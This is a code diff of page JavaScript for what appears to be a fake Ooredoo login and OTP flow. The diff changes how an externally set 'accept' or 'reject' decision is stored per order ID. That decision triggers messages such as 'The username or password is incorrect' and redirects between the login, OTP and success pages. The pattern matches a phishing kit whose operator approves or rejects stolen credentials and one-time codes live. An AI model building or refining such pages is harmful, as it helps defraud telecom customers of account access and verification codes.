@@ -78,26 +78,33 @@
 
 <script>
   function getFlowDecision() {
-    return localStorage.getItem('ooredooDecision') || sessionStorage.getItem('ooredooDecision') || '';
+    const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-current';
+    const decisionKey = 'ooredooDecision_' + orderId;
+    return localStorage.getItem(decisionKey) || sessionStorage.getItem(decisionKey) || '';
   }
 
   function setFlowDecision(decision) {
+    const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-current';
+    const decisionKey = 'ooredooDecision_' + orderId;
     try {
-      localStorage.setItem('ooredooDecision', decision);
-      sessionStorage.setItem('ooredooDecision', decision);
+      localStorage.setItem(decisionKey, decision);
+      sessionStorage.setItem(decisionKey, decision);
     } catch (err) {}
   }
 
   function checkDecision() {
-    const decision = getFlowDecision();
-    const flow = sessionStorage.getItem('ooredooFlow') || 'login';
-    const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-' + Date.now();
+    const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-current';
+    const decisionKey = 'ooredooDecision_' + orderId;
+    const flowKey = 'ooredooFlow_' + orderId;
+    const decision = localStorage.getItem(decisionKey) || sessionStorage.getItem(decisionKey) || '';
+    const flow = localStorage.getItem(flowKey) || sessionStorage.getItem(flowKey) || 'login';
 
     if (decision === 'accept') {
       if (flow === 'otp') {
-        localStorage.removeItem('ooredooDecision');
-        sessionStorage.removeItem('ooredooDecision');
-        sessionStorage.setItem('ooredooFlow', 'otp');
+        localStorage.removeItem(decisionKey);
+        sessionStorage.removeItem(decisionKey);
+        localStorage.setItem(flowKey, 'otp');
+        sessionStorage.setItem(flowKey, 'otp');
         window.location.href = 'success-en.html';
         return;
       }
@@ -121,9 +128,10 @@
       }
 
       sessionStorage.setItem('loginError', 'Your request has been approved. Please continue with the verification code.');
-      localStorage.removeItem('ooredooDecision');
-      sessionStorage.removeItem('ooredooDecision');
-      sessionStorage.setItem('ooredooFlow', 'otp');
+      localStorage.removeItem(decisionKey);
+      sessionStorage.removeItem(decisionKey);
+      localStorage.setItem(flowKey, 'otp');
+      sessionStorage.setItem(flowKey, 'otp');
       window.location.href = 'otp_ooredoo_en.html';
       return;
     }
@@ -131,17 +139,19 @@
     if (decision === 'reject') {
       if (flow === 'otp') {
         sessionStorage.setItem('otpError', 'The verification code is invalid or expired');
-        localStorage.removeItem('ooredooDecision');
-        sessionStorage.removeItem('ooredooDecision');
-        sessionStorage.setItem('ooredooFlow', 'otp');
+        localStorage.removeItem(decisionKey);
+        sessionStorage.removeItem(decisionKey);
+        localStorage.setItem(flowKey, 'otp');
+        sessionStorage.setItem(flowKey, 'otp');
         window.location.href = 'otp_ooredoo_en.html';
         return;
       }
 
       sessionStorage.setItem('loginError', 'The username or password is incorrect');
-      localStorage.removeItem('ooredooDecision');
-      sessionStorage.removeItem('ooredooDecision');
-      sessionStorage.setItem('ooredooFlow', 'login');
+      localStorage.removeItem(decisionKey);
+      sessionStorage.removeItem(decisionKey);
+      localStorage.setItem(flowKey, 'login');
+      sessionStorage.setItem(flowKey, 'login');
       window.location.href = 'login_ooredoo_en.html';
       return;
     }
